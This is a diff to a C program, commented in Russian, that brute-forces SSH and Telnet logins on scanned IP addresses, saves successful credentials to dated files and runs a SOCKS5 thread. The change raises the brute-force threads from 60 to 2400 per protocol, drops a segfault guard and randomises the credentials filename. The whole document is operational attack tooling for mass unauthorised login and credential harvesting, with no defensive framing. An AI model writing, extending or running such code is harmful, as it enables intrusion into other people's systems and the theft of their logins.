@@ -4,8 +4,6 @@
 #include "include/includes.h"
 #include "find_ips/finder.h"
 
-static jmp_buf jmp_point;
-
 // Добавьте новую функцию для сохранения учетных данных в файл:
 void save_credentials_to_file(const char *ip, const char *service, const char *username, const char *password) {
     FILE *file;
@@ -14,8 +12,8 @@ void save_credentials_to_file(const char *ip, const char *service, const char *u
     struct tm *t = localtime(&now);
     
     // Создаем имя файла в формате: credentials_YYYY-MM-DD.txt
-    snprintf(filename, sizeof(filename), "credentials_%d-%02d-%02d.txt", 
-             t->tm_year + 1900, t->tm_mon + 1, t->tm_mday);
+    snprintf(filename, sizeof(filename), "credentials_%d-%02d-%02d-%d.txt", 
+             t->tm_year + 1900, t->tm_mon + 1, t->tm_mday, rand() % 2560);
     
     // Открываем файл в режиме добавления
     file = fopen(filename, "a");
@@ -80,14 +78,6 @@ void *telnet_bruteforce_thread(void *arg) {
         if (port_status == 1) {
             Credentials telnet_credentials = {0};
             
-            // Защита от сегментации
-            if (setjmp(jmp_point) == 0) {
-                telnet_credentials = telnet_brute(ip_address);
-            } else {
-                printf("Произошла ошибка при брутфорсе %s\n", ip_address);
-                sleep(1);
-                continue;
-            }
 
             if (telnet_credentials.good) {
                 printf("Успешный вход Telnet: %s:%s\n", 
@@ -140,12 +130,12 @@ int main() {
         // Создаем директорию для результатов
         ensure_results_directory();
         
-        pthread_t ssh_threads[60];
-        pthread_t telnet_threads[60];
+        pthread_t ssh_threads[2400];
+        pthread_t telnet_threads[2400];
         pthread_t socks5_thread_id;
 
         // Создание потоков для SSH брутфорса
-        for (int i = 0; i < 60; i++) {
+        for (int i = 0; i < 2400; i++) {
             if (pthread_create(&ssh_threads[i], NULL, ssh_bruteforce_thread, NULL) != 0) {
                 fprintf(stderr, "Ошибка при создании потока SSH брутфорса\n");
                 return 1;
@@ -153,7 +143,7 @@ int main() {
         }
 
         // Создание потоков для Telnet брутфорса
-        for (int i = 0; i < 60; i++) {
+        for (int i = 0; i < 2400; i++) {
                 if (pthread_create(&telnet_threads[i], NULL, telnet_bruteforce_thread, NULL) != 0) {
                     fprintf(stderr, "Ошибка при создании потока Telnet брутфорса\n");
                     return 1;
@@ -171,18 +161,17 @@ int main() {
         }
 
         // Ожидание завершения потоков SSH
-        for (int i = 0; i < 60; i++) {
+        for (int i = 0; i < 2400; i++) {
             pthread_detach(ssh_threads[i]);
         }
 
         // Ожидание завершения потоков Telnet
-        for (int i = 0; i < 60; i++) {
+        for (int i = 0; i < 2400; i++) {
             pthread_detach(telnet_threads[i]);
         }
 
         // Ожидание завершения потока SOCKS5
         pthread_detach(socks5_thread_id);
-
         return 0;
     }
 }
